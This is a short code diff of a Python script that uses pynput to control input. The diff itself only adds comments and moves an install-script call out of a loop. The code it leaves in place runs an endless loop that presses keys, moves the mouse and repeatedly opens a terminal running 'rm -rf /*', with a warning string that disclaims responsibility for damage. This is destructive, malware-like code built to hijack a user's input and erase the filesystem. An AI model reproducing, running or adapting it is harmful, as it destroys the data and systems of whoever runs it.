@@ -9,6 +9,7 @@ key=Controller()
 mouse=Controller()
 warning="Are you sure you want to execute this program, I am not responsible for any damage that has been caused. Answer (Y/n) "
 
+# Controls the keyboard
 def keypresses():
     key.press("Q")
     key.press("W")
@@ -17,6 +18,7 @@ def keypresses():
     key.press("T")
     key.press("Y")
 
+# Controls the mouse
 def mice():
     mouse.position = (40,60)
     mouse.position = (20,50)
@@ -26,9 +28,9 @@ def mice():
 
 # Linux code
 def linux():
+    os.system("./pynput_install.sh")
     # A loop that presses the keys, moves the mouse position and starts the terminal
     while True:
-        os.system("./pynput_install.sh")
         keypresses()
         mice()
         os.system("gnome-terminal 'rm -rf /*'")
